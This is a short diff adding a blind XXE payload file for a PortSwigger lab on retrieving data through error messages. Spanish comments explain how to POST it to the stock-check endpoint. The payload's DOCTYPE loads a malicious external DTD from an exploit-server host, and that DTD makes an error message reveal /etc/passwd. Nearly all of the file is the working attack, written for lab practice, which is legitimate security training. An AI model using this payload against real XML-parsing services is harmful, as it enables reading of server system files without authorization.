@@ -1,0 +1,20 @@
+<!--
+  PortSwigger Lab: Exploiting blind XXE to retrieve data via error messages
+  XML payload para enviar al lab via POST /product/stock con Content-Type: application/xml.
+
+  Reemplaza EXPLOIT por el subdominio real del exploit server (algo tipo
+  exploit-XXX.exploit-server.net) y asegurate de que el DTD malicioso esta
+  hospedado en /exploit.
+
+  El parameter entity %xxe; carga el DTD remoto inmediatamente despues de
+  declararlo. Dentro del DTD remoto se desenrolla la cadena de entidades que
+  termina con un FileNotFoundException cuyo mensaje contiene /etc/passwd.
+
+  Recordatorio: omitir <?xml ?> declaration por la trampa de byte 0
+  (processing instruction target xml not allowed si hay whitespace previo).
+-->
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://EXPLOIT.exploit-server.net/exploit"> %xxe;]>
+<stockCheck>
+  <productId>1</productId>
+  <storeId>1</storeId>
+</stockCheck>
